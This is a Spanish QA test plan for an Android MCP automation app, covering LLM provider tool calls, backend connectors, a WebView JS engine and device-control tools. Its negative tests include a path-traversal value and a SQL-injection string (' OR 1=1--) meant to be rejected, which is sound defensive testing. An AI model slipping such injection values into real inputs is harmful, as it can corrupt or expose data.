# PLAN MAESTRO DE QA EXHAUSTIVO Y HARDWARE-IN-THE-LOOP (HITL) v2.0 — FÉNIX IA MOBILE MCP
**(REAJUSTADO TRAS AUDITORÍA ILIMITADA DE 36 CRÍTICAS DE `AXIOM CRITICÓN`)**

**Protocolo Combinado:** xAI / Tesla Autopilot HITL & Red-Teaming + Meta Sapienz (Motif-Based & Rich-State UI Testing) + Auditoría Anti-Falsos-Positivos `AXIOM CRITICÓN`  
**Repositorio Bajo Prueba:** `/home/eli/Documentos/fenix-mobile-mcp`  
**Documento de Auditoría Base:** `docs/AUDITORIA_CRITICON_PLAN_MAESTRO_QA.md` (36 críticas verificadas contra código)  
**Dispositivo Físico HITL:** Motorola Moto G77 5G (`ZY22MK7B2P`, Android 16 / SDK 36, `minSdk 33`, `targetSdk 34`, `compileSdk 37`, 8 GB RAM + 16 GB ZRAM)  
**Paquete Instalado:** `com.fenix.mobilemcp.foss.debug` (`app-foss-debug.apk`)  

---

## REGLA SUPREMA DE VEREDICTO QA: PROHIBICIÓN DE FALSOS POSITIVOS (CRÍTICAS #9, #14, #34 + PUNTO EJECUTIVO #9)
Queda **TERMINANTEMENTE PROHIBIDO** marcar una prueba como `PASS` basándose en:
- `catch` silencioso o retorno de texto plausible por parte del LLM cuando la herramienta falló.
- Respuestas de fallback simulado como `evaluateFallback` (`{"status":"ok","output":"Ejecutado con éxito"}`), `getCachedModels` tras un `429`, `parseModelsResponse catch -> emptyList()`, o `executeInProcess catch -> isError=true`. Todo camino de fallback debe etiquetarse obligatoriamente como **`FALLBACK/MOCK` (FAIL_E2E)**.

### Definición Formal de Estados de Veredicto por ID
1. **`PASS_E2E` (Único válido para cierre 100%):**
   - `result.isError == false` verificado programáticamente.
   - Evidencia cuádruple obligatoria adjunta al ID:
     1. **`ToolCallCard`** renderizada en UI con `isSuccess == true` y payload real verificable (IDs, SHAs, cálculos exactos, coordenadas).
     2. **`serverLog TOOL_CALL`** / registro en `FenixToolRegistry` sin excepción.
     3. **`adb logcat`** filtrado por PID de la app sin stacktraces ni fallbacks silenciosos.
     4. **`dumpsys` / Screenshot** pre y post acción confirmando el efecto lateral real en Android/SQLite/Red.
2. **`PASS_NEGATIVO`:** La prueba inyecta deliberadamente un input inválido, permiso denegado, token ausente o bloqueo Anti-Ban, y el sistema responde con `isError == true` + código de error estructurado esperado, `0 crashes`, `0 ANR` y `0 fugas de secretos`. *(Un `PASS_NEGATIVO` valida la defensa, pero **jamás** reemplaza al `PASS_E2E` funcional).*
3. **`PASS_BLOQUEO_CORRECTO`:** Herramienta deshabilitada en `OptionalToolPermissions` o sin permiso runtime concedido que rechaza la ejecución de forma determinista y segura.
4. **`FAIL_POR_AUSENCIA` / `NO_IMPLEMENTADO`:** El conector, método HTTP o tool MCP es un stub de constantes o no está registrado en `FenixToolRegistry.get(name)`. Debe implementarse antes de poder aspirar a `PASS_E2E`.

---

## SUITE 0·T: TOOLING BASE (GATE OBLIGATORIO · bloquea S1-S13)

> **Nota de desambiguación:** existía ya una «Suite 0» arquitectónica (abajo, con IDs `S0-01`/`S0-02`).
> Este gate de tooling se numera con prefijo **`S0T-`** para no colisionar, y la suite
> arquitectónica se relabela como **SUITE 0·A** conservando sus IDs originales (referenciados en
> `REPORTE_EJECUCION_QA_FENIX_MOBILE.md`, DEF-01/DEF-02). Fuente: `docs/INTEGRACION_TOOLING_QA.md`.

| ID | Acción | Verificación determinista |
|----|--------|---------------------------|
| S0T-01 | `agent-device` instalado | `agent-device --version` OK |
| S0T-02 | `agent-device doctor` verde | exit 0 + device ZY22MK7B2P |
| S0T-03 | MCP `agent-device` en agy | `agy mcp list` lo muestra enabled |
| S0T-04 | Resource `fenix-skills://qa/fenix-qa-evidence` visible | `list_mcp_resources` desde antigravity **y** opencode lo listan (mismo URI) |
| S0T-05 | `qa-precheck.sh` pasa | exit 0 |
| S0T-06 | Smoke: abrir SUT + snapshot | `agent-device open com.fenix.mobilemcp.foss.debug` + `snapshot -i` con ≥1 ref |
| S0T-07 | Replay smoke `.ad` <30s | `agent-device replay smoke.ad` exit 0 |
| S0T-08 | Validador de evidencia en verde | `scripts/qa-evidence-check.sh docs/qa-evidence/S0/<ID>` exit 0 en **100%** de IDs de la suite (o tool MCP `fenix_qa_evidence_check` → `EVIDENCIA_OK`), **con binding RUN_ID** (`run_id` de `result.json` == token en `log.txt`) — REGLA 7 |
| S0T-09 | Control negativo de calibración | Un caso que **debe** fallar devuelve `EVIDENCIA_FAIL`/exit 1 (ej. carpeta inexistente, `isError=true`, falta `screen.png`, fragmento de log ausente). Si el verificador da OK en un fallo → no calibrado → NO ejecutar S1-S13 — REGLA 8 |

**Si S0T falla → NO ejecutar S1-S13.** Un PASS sin tooling verde es un falso PASS (auditoría #1-#3).

**Cierre anti-alucinaciones (REGLA 7, agnóstico):** ningún ID de S0-T ni de S1-S13 se cierra en PASS sin `qa-evidence-check.sh` exit 0 **o** `fenix_qa_evidence_check` → `EVIDENCIA_OK` sobre su carpeta de evidencia. Vale en cualquier entorno — con sub-agentes, sin ellos, o a mano — porque es un script del repo y un tool del servidor Fénix, no una figura de agente.

---

## SUITE 0·A: AUDITORÍA DE ARQUITECTURA, INSTANCIAS Y FUGAS DE CLIENTES HTTP (CRÍTICAS #1, #2, #3, #8)
**Objetivo:** Corregir el diagnóstico previo y auditar las brechas reales del código fuente antes de ejecutar las suites funcionales.

| ID | Crítica | Componente / Archivo Real | Fallo Real Detectado por Criticón | Prueba de Verificación y Reparación Exigida |
| :--- | :--- | :--- | :--- | :--- |
| **S0-01** | **#1 (Bloqueante)** | `FenixDefaultToolInitializer.kt:20-44` vs `McpServerService.kt:444-502` vs `LoggedToolRegistration.kt:78-98` | `LoggedToolRegistrar.addTool()` sí registra simultáneamente en `FenixToolRegistry` y en `server?`. El bug real es la **doble instancia de dependencias**: `FenixDefaultToolInitializer` instancia un `FenixMemoryDb`, `ZoneMatcher` y `TurnScheduler`, mientras `McpServerService.registerFenixBundle()` instancia **otro** juego duplicado (2 DB helpers, 2 schedulers, 2 monitors vivos). | Ejecutar `memory_save` vía `FenixToolRegistry.executeInProcess` (Chat) y leer inmediatamente vía HTTP `POST /mcp` + `kvLeer` directo + `adb shell dumpsys dbinfo com.fenix.mobilemcp.foss.debug`. **Assert:** mismo `valor`, mismo `actualizado`, 1 sola instancia singleton Hilt compartida y `0 SQLiteDatabaseLockedException`. |
| **S0-02** | **#8 (Alta)** | `DynamicModelDiscovery.kt:54-63` + `SupabaseLite.kt` + `GmailClient.kt` + `DriveClient.kt` | Cada llamada a `discoverModelsForProvider`, `SupabaseLite.select`, `GmailClient` y `DriveClient` instancia un **nuevo `HttpClient(OkHttp)`** sin cerrarlo, causando fuga de File Descriptors (FD), sockets y `ConnectionPool` huérfanos. | Medir `adb shell ls /proc/<pid>/fd \| wc -l` y `dumpsys meminfo` antes y después de ejecutar `discoverAllAvailableModels()` 5 veces seguidas. **Assert:** `delta FD <= 20`. Si crece sin cota → `FAIL` y refactorizar a `HttpClient` singleton compartido. |

---

## SUITE 1: MAPEO DE SECRETS, PRE-VALIDACIÓN HOST Y FIDELIDAD TOOL-CALL EN LOS PROVEEDORES IA (CRÍTICAS #3, #4, #5, #6, #7)

### S1-00: Mapeo Jerárquico de `~/.fenix/secrets/api_keys.json` y Normalización de `SecureKeyStore` (Crítica #3)
- `SecureKeyStore.kt:83-149` ya es genérico (`saveApiKey(provider, key)` normaliza con `provider.trim().lowercase()`, prefijo `api_key_`).
- **Prueba S1-00a (Normalización):** Probar que `saveApiKey("Cerebras ", key)` y `hasApiKey("cerebras")` coinciden exactamente.
- **Prueba S1-00b (Separación de Categorías de Secrets):**
  - **Proveedores LLM OpenAI-Compat (entran a `DynamicModelDiscovery.standardProviders`):**
    1. `groq.api_key` → `providerId = "groq"` (`https://api.groq.com/openai/v1/models`)
    2. `openrouter.api_key` → `providerId = "openrouter"` (`https://openrouter.ai/api/v1/models`)
    3. `gemini.api_key` → `providerId = "gemini"` (`https://generativelanguage.googleapis.com/v1beta/openai/models`)
    4. `sambanova.api_key` → `providerId = "sambanova"` (`https://api.sambanova.ai/v1/models`)
    5. `deepseek` (presente en `DynamicModelDiscovery.kt:65`, verificar si tiene clave activa o marcar `PASS_NEGATIVO` sin key)
    6. `cerebras.api_key` → `providerId = "cerebras"` (`https://api.cerebras.ai/v1/models` — incorporar a `standardProviders`)
    7. `mistral.api_key` → `providerId = "mistral"` (`https://api.mistral.ai/v1/models` — incorporar a `standardProviders`)
    8. `cohere.api_key` → `providerId = "cohere"` (`https://api.cohere.ai/compatibility/v1/models` — incorporar a `standardProviders`)
  - **Secrets de Infraestructura / Conectores (PROHIBIDO inyectar como proveedor LLM en `/v1/models`):**
    - `github_token` (string plano) y `codex_proxy_pool.github_token` → Uso exclusivo en Suite 2 (`GitHubConnector`).
    - `codex_proxy_pool` (`local_key`, `admin_jwt_secret`, `agent_token_*`) → Uso exclusivo en pruebas de proxy/túnel; **assert** que no entra en `discoverAllAvailableModels()`.
    - `fenix_entregas.*`, `supabase.*`, `cloudflare.*`, `telegram.*` → Uso exclusivo en Suite 2.

### Pruebas por Proveedor LLM y Sub-Pruebas de Fidelidad (S1-01 a S1-09b)

| ID | Proveedor / Caso | Crítica | Prueba Host + Prueba en App Móvil (Moto G77) | Criterio Estricto de `PASS_E2E` |
| :--- | :--- | :--- | :--- | :--- |
| **S1-01** | **Groq Cloud** | — | Pre-check HTTP 200 en `/openai/v1/models` + chat simple + `tool_call` forzado (`memory_read`). | `isError == false` + `ToolCallCard` real. |
| **S1-02** | **OpenRouter (`:free`)** | **#4 (Bloqueante)** | Descubrimiento y filtro de modelos `:free` activos + chat + `tool_call`. | Modelo `:free` responde con `choices[0].message` no vacío. |
| **S1-02b** | **Headers Obligatorios OpenRouter** | **#4 (Bloqueante)** | `FenixLlmClient.kt:147-153` y `DynamicModelDiscovery.kt:132-138` actualmente **no envían `HTTP-Referer` ni `X-Title`**. | Interceptar request y verificar que el `POST` a `openrouter.ai` incluya `HTTP-Referer` y `X-Title`. Si faltan → reparar `FenixLlmClient` antes de continuar. |
| **S1-03** | **Google Gemini** | **#5 (Bloqueante)** | Descubrimiento en `/v1beta/openai/models` + chat + `tool_call`. | Respuesta y ejecución real sin pérdida de `tool_calls`. |
| **S1-03b** | **Tool-Call Fidelity (Gemini / Mistral / Cohere)** | **#5 (Bloqueante)** | `FenixLlmClient.parse` (`172-183`) asume que `function.arguments` es `JsonPrimitive` string; si el proveedor devuelve un `JsonObject` ya parseado, `jsonPrimitive.content` lanza excepción y `mapNotNull` lo traga en silencio (0 `tool_calls`). | Enviar prompt forzado (`"llama a memory_read con clave=test"`). **Assert triple:** (1) `tool_calls` no vacío, (2) `function.name == "memory_read"`, (3) `arguments` parseable tanto si llega como String JSON o como `JsonObject` en `FenixLlmClient` y `ChatViewModel.parseJsonArgs`. Loggear raw `bodyAsText` truncado sin secrets. |
| **S1-04** | **SambaNova** | — | Pre-check `/v1/models` + chat + `tool_call` en Moto G77. | `isError == false` + `ToolCallCard` verificada. |
| **S1-05** | **Cerebras** | **#3** | Incorporar a `standardProviders`, validar `/v1/models` + chat + `tool_call`. | `isError == false` + latencia registrada. |
| **S1-06 / 06b** | **Mistral AI** | **#3, #5** | Incorporar a `standardProviders`, validar `/v1/models` + test de fidelidad `S1-03b`. | `tool_calls` no vacío + `arguments` parseado sin catch silencioso. |
| **S1-07 / 07b** | **Cohere** | **#3, #5** | Incorporar endpoint `/compatibility/v1/models` + test de fidelidad `S1-03b`. | `tool_calls` no vacío + `arguments` parseado sin catch silencioso. |
| **S1-08 / 08b** | **SLM Local Termux (`qwen2.5-0.5b-instruct-q4_k_m.gguf` en `:8081`)** | **#6 (Bloqueante)** | El modelo 0.5B en `llama-server:8081` no soporta `tools` OpenAI de forma fiable (`400 unknown field tools` o texto libre), y `ChatViewModel.refreshModels():108` prefiere `isLocal` por defecto, lo que haría fallar S4 si intenta usar `tools` contra el 0.5B. | (1) Probar `includeTools=false` vs `includeTools=true` contra `127.0.0.1:8081` y registrar status HTTP y raw body. (2) Si `includeTools=true` falla o no emite `tool_calls`, configurar fallback limpio en `FenixLlmClient`/`ChatViewModel`: chat local sin `tools` + no autoseleccionar el SLM 0.5B para suites de `tool_calling` (S4). (3) Medir `tokens/s` con fórmula exacta de `llama-server` (`timings.predicted_n / (timings.predicted_ms / 1000.0)`) y temperatura vía `dumpsys battery`. |
| **S1-09 / 09b** | **Ollama Host (Túnel ADB `:11434`)** | **#7 (Alta)** | Verificar existencia y versionado del script de puente USB o comando determinista `adb reverse tcp:11434 tcp:11434`. | Pre-evidencia obligatoria con `adb reverse --list`, prueba de descubrimiento/chat en `:11434`, y **re-test de resiliencia** tras ejecutar `adb kill-server && adb start-server`. |

---

## SUITE 2: INVENTARIO DE SUPERFICIE REAL Y TESTEO DE LOS 9 CONECTORES (CRÍTICAS #2, #9, #10, #11, #12, #13 + PUNTO EJECUTIVO #1)

### S2-00: Auditoría de Superficie Real de Conectores (Pre-Suite Obligatoria — Crítica #2)
La inspección de código demuestra que **6 de los 9 archivos en `connectors/` son actualmente objetos de constantes o stubs sin cliente HTTP ni herramienta MCP registrada**, mientras que solo 3 tienen implementación HTTP real (`SupabaseLite.kt`, `GmailClient.kt`, `DriveClient.kt`) pero aún sin tool wrapper en `FenixToolRegistry`.
- **Regla S2-00:** Antes de ejecutar `S2-01..S2-09`, ejecutar un assert programático `FenixToolRegistry.get(toolName) != null`.
  - Si devuelve `null` o la clase subyacente es un stub de constantes → marcar inmediatamente **`FAIL_POR_AUSENCIA` / `NO_IMPLEMENTADO`** en la captura inicial, implementar el cliente HTTP real + su registro en `FenixToolRegistry` con schema JSON estricto, y recién entonces ejecutar el re-test para alcanzar `PASS_E2E`.

| ID | Conector y Estado Actual en Código | Crítica | Requerimiento de Implementación y Prueba End-to-End / Negativa |
| :--- | :--- | :--- | :--- |
| **S2-01** | `backend/CloudflareClient.kt:11-17` *(Stub: solo `routeOrder()`, sin HTTP ni tool)* | **#2** | Estado inicial: `FAIL_POR_AUSENCIA`. Implementar métodos HTTP reales contra Cloudflare API v4 (`verifyToken`, KV read/write acotado) y registrar tool `cloudflare_verify_token`. **Assert `PASS_E2E`:** HTTP 200 de Cloudflare con `"status": "active"`. |
| **S2-02 / 02b** | `backend/SupabaseLite.kt:22-56` *(Tiene HTTP `select` + `heartbeat`, pero sin tool registrado ni validación SSRF)* | **#2, #10 (Alta)** | (1) Registrar tool `supabase_select` con **allowlist estricta de `baseUrl`** (solo las 2 URLs de secrets: `fenix_entregas.supabase_url` y `supabase.api_url`) para impedir SSRF, y **allowlist de tablas**. (2) Prohibir el uso de `service_role_key` en el móvil (usar exclusivamente `anon_key`). (3) Probar `table=inexistente` y `columns=*` → debe fallar cerrado (`PASS_NEGATIVO`) sin quemar egress (límite 5 GB free tier) ni volcar keys. (4) **Assert `PASS_E2E`:** consulta acotada (`limit <= 10`) evidenciando `content-length` y filas reales en `ToolCallCard`. |
| **S2-03** | `entregas/EntregasFirstParty.kt:11-21` *(Stub: solo constantes de nombres de tablas)* | **#2, #10** | Estado inicial: `FAIL_POR_AUSENCIA`. Implementar lectura/registro sobre `SupabaseLite` con `anon_key` + RLS (sin `service_role_key` en el APK) y registrar tools `entregas_registrar_evento` / `entregas_consultar_zonas`. **Assert `PASS_E2E`:** inserción y lectura verificada de evento de telemetría propia first-party. |
| **S2-04 / 04b** | `github/GitHubConnector.kt:9-22` *(Stub: solo `API_BASE`, listas de scopes y timeout, sin `GET/POST`)* | **#2, #11 (Alta)** | Estado inicial: `FAIL_POR_AUSENCIA`. Distinguir los 2 tokens en secrets (`github_token` plano vs `codex_proxy_pool.github_token`). Pre-check en host con `curl -H "Authorization: Bearer $TOKEN" https://api.github.com/rate_limit` y `GET /repos/{owner}/{repo}/commits?per_page=1` definiendo owner y repo canónico. Implementar cliente HTTP y tool `github_get_repo_commits`. **Assert doble:** (1) Con token válido → `sha` real del último commit en `ToolCallCard` (`PASS_E2E`); (2) Con token sin scopes/inválido → `401/403` estructurado con `isError=true`, nunca lista vacía `200 []` (`PASS_NEGATIVO`). |
| **S2-05** | `google/GmailClient.kt:36-63` *(Tiene HTTP `historyList` + `searchAll`, pero decodifica `HistoryDto` sin chequear HTTP status)* | **#9 (Bloqueante)** | Corregir `GmailClient` para verificar `response.status.isSuccess()` antes de `decodeFromString`. **Doble Assert obligatorio:** (1) Con token inválido/ausente → `isError=true` + código `401/OAuth` sin `NullPointerException` ni crash (`PASS_NEGATIVO`); (2) Prohibido dar `PASS_E2E` solo con el caso (1): para `PASS_E2E` se requiere token OAuth válido listando $\ge 1$ mensaje real con su `id` en `ToolCallCard`. |
| **S2-06** | `google/DriveClient.kt:56-94` *(Tiene HTTP `list` + `get`, pero importa `isSuccess` sin usarlo)* | **#9 (Bloqueante)** | Corregir `DriveClient` para validar `response.status.isSuccess()`. **Doble Assert obligatorio:** (1) Sin token / token inválido → `isError=true` + error estructurado (`PASS_NEGATIVO`); (2) Con token OAuth real → listar $\ge 1$ archivo real con `id` y `name` (`PASS_E2E`). |
| **S2-07** | `google/GoogleOAuth.kt:10-26` *(Stub: solo `CALLBACK_URL`, scopes y allowlist; sin PKCE ni `build_url`)* | **#2** | Estado inicial: `FAIL_POR_AUSENCIA`. Implementar generador PKCE (`code_verifier` + `code_challenge` S256) + constructor de URL OAuth2 validado contra `ALLOWLIST` + guardado en `SecureKeyStore`. Verificar en `S2-07` generación determinista de URL y rechazo de `redirect_uri` fuera de allowlist. |
| **S2-08 / 08b** | `social/SocialReadOnly.kt:10-27` *(Stub: solo paquetes + constantes dwell, sin red ni Telegram)* | **#2, #12 (Media)** | Separar claramente: (1) `SocialReadOnly`: verificar cumplimiento de `MAX_PROFILE_VISITS_PER_HOUR = 40`, dwell time anti-ban y **evidencia de 0 llamadas a Graph API**. (2) Conector Telegram (`telegram.bot_token`): usar chat/mensaje de prueba QA con limpieza posterior (`deleteMessage`), verificando `message_id` real y lectura vía `getUpdates` sin spamear canales productivos. |
| **S2-09 / 09b** | `whatsapp/WhatsAppHybrid.kt:10-19` *(Stub: solo `PACKAGE` + constantes de pausa)* | **#2, #13 (Alta)** | Implementar `whatsapp_prepare_message` con **validación estricta de URI** (`https://wa.me/<solo_digitos>?text=<url_encoded>`), bloqueando inyección de URIs arbitrarias. **Assert triple:** (1) Abre Intent nativo seguro sin ejecutar `dispatchGesture` sobre `com.whatsapp`; (2) Lectura de notificación entrante en `daniele_notification_list` en `<10s` verificando que el dedup hash de `McpNotificationListenerService.kt:47-61` no descarte mensajes legítimos consecutivos; (3) Si `com.whatsapp.w4b` no está instalado → retorna `isError=true` estructurado (`PASS_NEGATIVO`), 0 crash. |

---

## SUITE 3: AUDITORÍA ANTI-FALLBACK DEL MOTOR JS (`QuickJsSkillEngine.kt`) Y SKILLS (`SkillCatalog.kt`) (CRÍTICAS #14, #15, #16 + PUNTO EJECUTIVO #2)

### S3-A: Skills de `SkillCatalog.kt` y Herramientas `zone_check` / `turn_watch` (Crítica #15)
- `SkillCatalog.BUILT_IN` (`SkillCatalog.kt:17-29`) define 2 objetos `FenixSkill(TEXT)` (`turno-radar` y `zona-sj`) que son **plantillas textuales de contexto/prompt, NO herramientas ejecutables**.
- Las herramientas ejecutables reales son `zone_check` y `turn_watch` en `FenixTools.kt:156-274`.

| ID | Objetivo | Crítica | Prueba Exacta y Criterio de Aceptación |
| :--- | :--- | :--- | :--- |
| **S3-01b** | **`turn_watch` + `TurnScheduler` + `TurnMetricsStore`** | **#15 (Bloqueante)** | `turn_watch` actualmente ignora `desde_hora`/`hasta_hora` y solo invoca `scheduler.start()`. **Prueba:** Invocar `turn_watch` con rango horario, verificar que `TurnScheduler.getMode()` cambia al estado activo y que al inyectar una notificación de prueba se persiste una fila real en `TurnMetricsStore` (no basta con recibir `{"vigilando": true}`). |
| **S3-02b** | **`zone_check` (Texto) vs GPS Real (`daniele_get_location`)** | **#15 (Bloqueante)** | `zone_check` recibe `{direccion: String}` textual (NO coordenadas lat/lng; pasar `"-31.5375, -68.5364"` daba falso `peligrosa: false`). **Prueba:** (1) Invocar `zone_check` con 3 direcciones canónicas de San Juan: 1 zona peligrosa registrada en las 41 zonas de `ZoneMatcher`, 1 zona segura y 1 dirección ambigua; **assert** `hits[].zone_id` exacto. (2) Prohibir pasar coordenadas crudas a `zone_check` sin geocodificación inversa o matcher geométrico. |

### S3-B: Pruebas Anti-Fallback y Destrucción de WebView en `QuickJsSkillEngine.kt` (Críticas #14 y #16)
> **Hallazgo Crítico #14:** `QuickJsSkillEngine.kt:37-94` NO usa `cash.breezy.quickjs`; usa `AndroidScriptEvaluator` sobre `WebView.evaluateJavascript` + `new Function('args', code)` y tiene un método `evaluateFallback` (`87-93`) que **devuelve siempre `{"status":"ok","output":"Ejecutado con éxito"}` sin ejecutar nada** cuando falla o cuando se invoca sin Looper. Además, un `while(true){}` deja el `WebView` vivo para siempre porque `webView.destroy()` solo está dentro del callback de éxito.

| ID | Caso de Prueba | Crítica | Procedimiento y Assert Anti-Fallback |
| :--- | :--- | :--- | :--- |
| **S3-03b** | **Validación Estricta en `crear_conector`** | **#14** | Intentar registrar un conector con: (a) `schema_json` malformado (no JSON), (b) `nombre` con caracteres de path traversal (`../`) o SQL injection (`' OR 1=1--`), (c) `codigo_js` vacío. **Assert:** `isError == true` (`PASS_NEGATIVO`), rechazando el registro en `conectores_dinamicos`. |
| **S3-04** | **`listar_conectores` Determinista** | **#16** | Verificar que `listar_conectores` devuelve el inventario exacto sin duplicados por doble inicialización (`FenixDefaultToolInitializer` vs `McpServerService`). |
| **S3-05b** | **Ejecución Matemática Anti-Fallback (Chat + HTTP `/mcp`)** | **#14 (Bloqueante)** | Prohibido aceptar `"Ejecutado con éxito"` como `PASS`. Crear conector `suma_qa(a, b)` que retorne `args.a + args.b`. Invocarlo con `{"a": 17, "b": 25}`: (1) desde `ChatViewModel` (`executeInProcess`), y (2) desde un cliente externo vía `POST /mcp` (hilo Netty IO de Ktor). **Assert:** Ambos caminos deben devolver exactamente `42`. Eliminar `evaluateFallback` engañoso para que cualquier fallo de motor devuelva `isError = true`. |
| **S3-06b** | **Persistencia Real de `creado` tras Cold Start** | **#16 (Alta)** | `restoreStoredConnectors()` (`QuickJsSkillEngine.kt:288-293`) llamaba a `registerDynamicConnector()` → `guardarConector()`, sobrescribiendo el timestamp `creado = now` en cada reinicio. **Prueba:** Registrar conector, leer timestamp `creado_original` en SQLite, ejecutar `adb shell am force-stop com.fenix.mobilemcp.foss.debug`, reabrir la app y consultar SQLite + `listar_conectores`. **Assert:** `creado == creado_original` (inmutable), `count` idéntico y output `42` intacto. |
| **S3-07b** | **Loop Infinito `while(true){}` sin Fuga de WebView ni ANR** | **#14 (Bloqueante)** | Crear conector con `while(true){}` e invocarlo. **Requerimiento de código:** asegurar que en el bloque `finally` / timeout de `withTimeoutOrNull(5000)` se invoque `webView.stopLoading()`, `webView.loadUrl("about:blank")` y `webView.destroy()` en el Main Thread. **Assert en Moto G77:** retorna `isError = true` por timeout a los 5s, la UI sigue respondiendo (`daniele_wait` `<500 ms`), `0 ANR` en `logcat`, y el conteo de instancias WebView en `dumpsys meminfo` no crece. |
| **S3-08** | **`eliminar_conector` Completo** | — | Eliminar `suma_qa`, verificar que `FenixToolRegistry.get("suma_qa") == null` y que la fila fue borrada de `conectores_dinamicos` en SQLite WAL. |

---

## SUITE 4: MATRIZ PERMISO × REGISTRO × EJECUCIÓN Y TESTEO DE LAS HERRAMIENTAS DEL DISPOSITIVO (CRÍTICAS #17, #18, #19 + PUNTO EJECUTIVO #3)

### S4-00: Matriz Previa `Permiso × Registro × Ejecución` en Android 16 / SDK 36 (Críticas #17 y #18)
Antes de ejecutar las herramientas de dispositivo, se auditará el estado real de permisos del paquete con:
`adb shell dumpsys package com.fenix.mobilemcp.foss.debug | grep -E "permission|granted"`
y se verificará para cada herramienta su triple estado:
1. `isToolEnabled` en configuración de usuario (`McpToolsSettingsScreen`).
2. `OptionalToolPermissions.effectivePermissions` (`McpServerService.kt:309-310`).
3. `FenixToolRegistry.get(name) != null`.
- Cada herramienta sensible se probará en **ambos estados**: con permiso concedido (`PASS_E2E`) y con permiso/toggle revocado (`PASS_BLOQUEO_CORRECTO` con `isError == true`).

### Catálogo de Pruebas Atómicas de Herramientas de Dispositivo (S4-01 a S4-61)

#### 4.1 `ScreenIntrospectionTools.kt` + `CompactUiPruner.kt`
- **S4-01 `daniele_get_screen_state`:** Comparar modo `raw` vs `compact=true` (`CompactUiPruner`, límite 40 nodos relevantes); medir reducción real de bytes/tokens y verificar captura de screenshot Base64.
- **S4-02 `daniele_find_elements`:** Búsqueda determinista por `text`, `contentDescription`, `resourceId` y `className`.
- **S4-03 `daniele_wait_for_element`:** Espera con timeout explícito (`10000 ms`) verificando que el `CacheInvalidationDebouncer` (`250 ms`) refresca el árbol sin devolver nodos obsoletos.

#### 4.2 `TouchActionTools.kt`
- **S4-04 `daniele_tap`:** Toque en `(x, y)` con screenshot pre/post.
- **S4-05 `daniele_long_press`:** Pulsación larga con duración controlada.
- **S4-06 `daniele_double_tap`:** Doble toque rápido en `(x, y)`.
- **S4-07 `daniele_multi_touch`:** Gesto multitouch simultáneo.

#### 4.3 `GestureTools.kt`
- **S4-08 `daniele_swipe`:** Deslizamiento `(x1, y1) -> (x2, y2)`.
- **S4-09 `daniele_scroll`:** Scroll direccional (`up`, `down`, `left`, `right`) verificando invalidación de caché de nodos tras el desplazamiento.
- **S4-10 `daniele_pinch`:** Gesto de pellizco con factor de escala.

#### 4.4 `NodeActionTools.kt`
- **S4-11 `daniele_click_node`:** Clic semántico por `node_id`.
- **S4-12 `daniele_long_click_node`:** Long-click por `node_id`.
- **S4-13 `daniele_tap_node`:** Toque en el centroide geométrico del `node_id`.
- **S4-14 `daniele_scroll_to_node`:** Scroll iterativo hasta visibilizar el nodo y re-resolución de `node_id` post-scroll.
- **S4-15 `daniele_wait_for_node`:** Espera reactiva de aparición de nodo.
- **S4-16 `daniele_get_node_details`:** Inspección completa de propiedades de accesibilidad del nodo.

#### 4.5 `SystemActionTools.kt` (Con Restricciones Reales de Android 16 / SDK 36 — Crítica #18)
- **S4-17 `daniele_press_back`**, **S4-18 `daniele_press_home`**, **S4-19 `daniele_press_recents`**, **S4-20 `daniele_open_notifications`**, **S4-21 `daniele_open_quick_settings`**: Acciones globales de `AccessibilityService`.
- **S4-22 / S4-22b `daniele_get_device_logs` (Restricción `READ_LOGS` SDK 36):** En Android 16, `READ_LOGS` es permiso `signature|privileged`; una app third-party **solo puede leer los logs de su propio PID** (`logcat --pid=<myPid>`). **Assert:** Devuelve las líneas reales del propio proceso de Fénix sin prometer lectura de logs de otras apps.
- **S4-23 `daniele_get_system_info`:** Verificar reporte de `Moto G77 5G`, `SDK 36`, RAM y batería.
- **S4-24 `daniele_get_current_app`:** Identificar paquete/activity en foreground.
- **S4-25 `daniele_wake_device`:** Despertar pantalla inactiva.

#### 4.6 `TextInputTools.kt`
- **S4-26 `daniele_type_text`**, **S4-27 `daniele_replace_text`**, **S4-28 `daniele_clear_text`**, **S4-29 `daniele_press_key`**, **S4-30 `daniele_get_clipboard`**, **S4-31 `daniele_set_clipboard`** (teniendo en cuenta que en Android 10+ `get_clipboard` requiere que la app tenga foco o sea el IME/Accessibility activo).

#### 4.7 `UtilityTools.kt` (Semántica Real, No-Mock y Cancelación — Crítica #19)
- **S4-32 / S4-32b `daniele_wait`:** Invocar `daniele_wait(durationMs = 2000)` y medir tiempo real de pared. **Assert:** `elapsedMs in 1900..2500` (prohibido mock de `0 ms`). Probar además `job.cancel()` a mitad del `wait` → verificar que no queda colgado el `ReferenceCountedToolCallIndicator` ni genera logs fantasma en `loggedToolHandler` (`LoggedToolRegistration.kt:53-61`).
- **S4-33 / S4-33b `daniele_retry`:** Probar `daniele_retry` envolviendo una acción que falla determinísticamente 3 veces. **Assert:** `result.isError == true` (prohibido tragar el error original y devolver `isSuccess = true` con texto `"reintentado 3 veces"`) + conteo exacto de los 3 intentos en el log.

#### 4.8 `FileTools.kt` (Con Restricciones Scoped Storage SDK 36 — Crítica #18)
- **S4-34 `daniele_list_storage_locations`**, **S4-35 `daniele_list_files`**, **S4-36 `daniele_write_file`**, **S4-37 `daniele_append_file`**, **S4-38 `daniele_read_file`**, **S4-39 `daniele_replace_in_file`**, **S4-40 `daniele_copy_file`**, **S4-41 `daniele_delete_file`**: Ciclo completo CRUD verificando hashes/contenidos en las ubicaciones autorizadas por `StorageLocationProvider`.

#### 4.9 `AppManagementTools.kt`
- **S4-42 `daniele_list_installed_apps`**, **S4-43 `daniele_open_app`**, **S4-44 `daniele_get_app_info`**, **S4-45 `daniele_close_app`**.

#### 4.10 `IntentTools.kt`
- **S4-46 `daniele_send_intent`**, **S4-47 `daniele_open_uri`**, **S4-48 `daniele_get_intent_activities`**.

#### 4.11 `NotificationTools.kt`
- **S4-49 `daniele_notification_list`**, **S4-50 `daniele_notification_action`**, **S4-51 `daniele_notification_reply`**, **S4-52 `daniele_notification_dismiss`**.

#### 4.12 `LocationTools.kt` (Restricciones Background Location en `fossDebug` — Crítica #18)
